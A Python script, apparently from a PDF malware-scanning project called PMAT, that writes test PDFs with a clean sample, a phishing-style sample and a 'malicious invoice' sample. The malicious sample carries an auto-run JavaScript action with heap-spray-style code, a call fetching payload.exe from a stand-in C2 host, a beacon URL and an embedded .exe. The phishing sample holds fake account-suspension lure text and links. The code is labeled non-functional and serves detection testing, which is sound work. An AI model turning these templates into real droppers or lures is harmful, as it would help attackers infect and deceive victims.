#!/usr/bin/env python3
"""
Generate safe sample PDFs for testing PMAT.
These PDFs contain malicious-looking structure but are NOT functional malware.
For educational/testing purposes only.
"""

import pikepdf
import zlib
import base64
import os

def create_sample_malicious_pdf(output_path):
    """
    Creates a PDF that contains the structural indicators of a malicious PDF:
    - /JavaScript action
    - /OpenAction trigger
    - Obfuscated JavaScript (non-functional)
    - Embedded object
    - Suspicious URI
    This is purely for demonstrating detection — the JS does nothing harmful.
    """
    # Raw PDF content with malicious-looking indicators
    raw_pdf = b"""%PDF-1.6
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 5 0 R
   /AcroForm 7 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [3 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Resources << /Font << /F1 4 0 R >> >>
   /Contents 8 0 R
   /AA << /O 5 0 R >>
>>
endobj

4 0 obj
<< /Type /Font
   /Subtype /Type1
   /BaseFont /Helvetica
>>
endobj

5 0 obj
<< /Type /Action
   /S /JavaScript
   /JS 6 0 R
>>
endobj

6 0 obj
<< /Length 312 >>
stream
// PMAT Test Sample - Non-functional JavaScript for detection testing
var payload = unescape('%u4141%u4141%u4141%u4141');
var spray = new Array(200);
for(var i=0;i<200;i++){
  spray[i] = payload + String.fromCharCode(0x41,0x42,0x43);
}
eval(unescape('%2F%2F+test+payload'));
app.openDoc({cPath: "http://malicious-c2-server.ru/payload.exe"});
endstream
endobj

7 0 obj
<< /Fields []
   /DR << >>
>>
endobj

8 0 obj
<< /Length 200 >>
stream
BT
/F1 14 Tf
50 750 Td
(INVOICE #2024-9921 - Please review the attached document.) Tj
0 -30 Td
(Click to enable content and view the full invoice.) Tj
0 -30 Td
(Document secured with Adobe LiveCycle DRM.) Tj
ET
endstream
endobj

9 0 obj
<< /Type /Filespec
   /F (invoice_attachment.exe)
   /EF << /F 10 0 R >>
>>
endobj

10 0 obj
<< /Type /EmbeddedFile
   /Length 44
>>
stream
This is a simulated embedded file payload - NOT REAL
endstream
endobj

11 0 obj
<< /Type /Action
   /S /URI
   /URI (http://malicious-c2-server.ru/beacon?id=victim123)
>>
endobj

12 0 obj
<< /Author ()
   /Creator (Microsoft Word 2019)
   /Producer (Adobe PDF Library 15.0)
   /CreationDate (D:20231014092211+00'00')
   /ModDate (D:20231102145543+00'00')
   /Title (Invoice Q4 2023)
>>
endobj

xref
0 13
0000000000 65535 f 
0000000009 00000 n 
0000000098 00000 n 
0000000157 00000 n 
0000000338 00000 n 
0000000428 00000 n 
0000000515 00000 n 
0000000881 00000 n 
0000000930 00000 n 
0000001184 00000 n 
0000001316 00000 n 
0000001431 00000 n 
0000001524 00000 n 

trailer
<< /Size 13
   /Root 1 0 R
   /Info 12 0 R
>>
startxref
1720
%%EOF
%%EOF
"""
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "wb") as f:
        f.write(raw_pdf)
    print(f"[+] Created malicious sample: {output_path}")


def create_clean_pdf(output_path):
    """Creates a clean, benign PDF for comparison testing."""
    raw_pdf = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Resources << /Font << /F1 4 0 R >> >>
   /Contents 5 0 R
>>
endobj

4 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

5 0 obj
<< /Length 120 >>
stream
BT
/F1 12 Tf
50 750 Td
(Hello World - This is a clean PDF document.) Tj
0 -20 Td
(No malicious content here.) Tj
ET
endstream
endobj

6 0 obj
<< /Author (John Smith)
   /Creator (LibreOffice 7.4)
   /Producer (LibreOffice PDF Export)
   /CreationDate (D:20240315103000+00'00')
   /Title (Meeting Notes March 2024)
>>
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000274 00000 n 
0000000353 00000 n 
0000000525 00000 n 

trailer
<< /Size 7 /Root 1 0 R /Info 6 0 R >>
startxref
660
%%EOF
"""
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "wb") as f:
        f.write(raw_pdf)
    print(f"[+] Created clean sample  : {output_path}")


def create_medium_risk_pdf(output_path):
    """Creates a medium-risk PDF (has URIs and suspicious metadata but no JS)."""
    raw_pdf = b"""%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Annots [6 0 R 7 0 R]
   /Resources << /Font << /F1 4 0 R >> >>
   /Contents 5 0 R
>>
endobj

4 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

5 0 obj
<< /Length 160 >>
stream
BT
/F1 12 Tf
50 750 Td
(URGENT: Your account has been suspended.) Tj
0 -20 Td
(Click the link below to verify your identity immediately.) Tj
0 -20 Td
(Failure to verify within 24 hours will result in account closure.) Tj
ET
endstream
endobj

6 0 obj
<< /Type /Annot
   /Subtype /Link
   /Rect [50 680 400 700]
   /A << /S /URI /URI (http://phishing-bank-secure.xyz/login?redirect=steal) >>
>>
endobj

7 0 obj
<< /Type /Annot
   /Subtype /Link
   /Rect [50 650 400 670]
   /A << /S /URI /URI (http://192.168.1.105/track?uid=victim_8821) >>
>>
endobj

8 0 obj
<< /Author ()
   /Creator (Unknown)
   /Producer (PDF Producer 1.0)
   /CreationDate (D:20231201000000)
   /ModDate (D:20240115123000)
   /Title (Account Verification Required)
>>
endobj

xref
0 9
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000280 00000 n 
0000000358 00000 n 
0000000570 00000 n 
0000000720 00000 n 
0000000860 00000 n 

trailer
<< /Size 9 /Root 1 0 R /Info 8 0 R >>
startxref
1050
%%EOF
%%EOF
%%EOF
"""
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "wb") as f:
        f.write(raw_pdf)
    print(f"[+] Created medium sample : {output_path}")


if __name__ == "__main__":
    print("[*] Generating PMAT test sample PDFs...\n")
    create_sample_malicious_pdf("samples/sample_malicious_invoice.pdf")
    create_clean_pdf("samples/sample_clean_document.pdf")
    create_medium_risk_pdf("samples/sample_phishing_email.pdf")
    print("\n[*] All samples created successfully.")
    print("    Run: python pmat.py scan samples/sample_malicious_invoice.pdf")
